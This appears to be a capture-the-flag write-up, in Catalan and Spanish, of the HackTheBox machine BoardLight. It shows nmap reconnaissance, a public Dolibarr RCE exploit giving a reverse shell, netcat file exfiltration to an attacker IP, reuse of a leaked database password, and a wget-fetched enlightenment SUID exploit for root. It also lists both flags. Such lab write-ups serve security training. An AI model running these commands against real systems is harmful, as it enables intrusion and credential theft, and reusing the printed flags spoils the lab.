# BoardLight

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
Created time: 2 de diciembre de 2024 14:00
IP: 10.10.11.11

# Reconocimiento

NMAP (allports)

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.11 -oN extractports``

```

> Resultats:
> 
> 
> ![image.png](<imagenes/image.png>)
> 

NMAP Ports:

```bash
sudo nmap -p22,80 -sCV 10.10.11.11 -oN nmap

```

> Resultats:
> 
> 
> ![image.png](<imagenes/image 1.png>)
> 

Análisis de vulnerabilidades

POC RCE
[https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

# Explotación de vulnerabilidades

Executem exploit per a Dolibar 17.0.0

```bash
python3 exploit.py <http://crm.board.htb> admin admin 10.10.14.185 4444
nc -lvnp 4444

```

![image.png](<imagenes/image 2.png>)

Tractament TTY:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

```

# Escalada de privilegios

![image.png](<imagenes/image 3.png>)

Trobem al directori /tmp/pr4gm$:

![image.png](<imagenes/image 4.png>)

descarreguem el arxiu

Comando máquina atacante:

```bash
 nc -lvp 4444 > linpeas.txt

```

Comando máquina víctima:

```bash
nc 192.168.106.128 4444 -w 3 < linpeas.txt

```

Busquem dins del fitxer si trobem dades

```bash
cat results | grep board
```

Trobem la configuracio de la base de dades:

![image.png](<imagenes/image 5.png>)

Trobem diferents usuaris per la BD: config.php

![image.png](<imagenes/image 6.png>)

Pass: serverfun2$2023!!

Provem aquest password amb usuari larissa

Escalem privilegis a larissa

Canviem la revershell per ssh i entrem com a larissa
trobem flag: user.txt

user.txt: 8551aca9cdeb37137c17fd1fa350ea1a

Busquem per suid:

```bash
find / -perm -u=s -type f 2>/dev/null

```

![image.png](<imagenes/image 7.png>)

Trobem que podem explotar el enlightenment_sys
Busquem exploit:

[https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)

El copiem amb

```bash
'Maquina nostre'

python3 -m http.server 80 `a la carpeta on tenim el fitxer`

'Maquina victima'

wget nostreip/nom_fitxer

```

Donem permisos:

chmod a+x [exploit.sh](http://exploit.sh/)

executem [exploit.sh](http://exploit.sh/)

![image.png](<imagenes/image 8.png>)

# Bandera(s)

> User:  8551aca9cdeb37137c17fd1fa350ea1a
Root: 75a52752844333fea88a3d9c60494889
>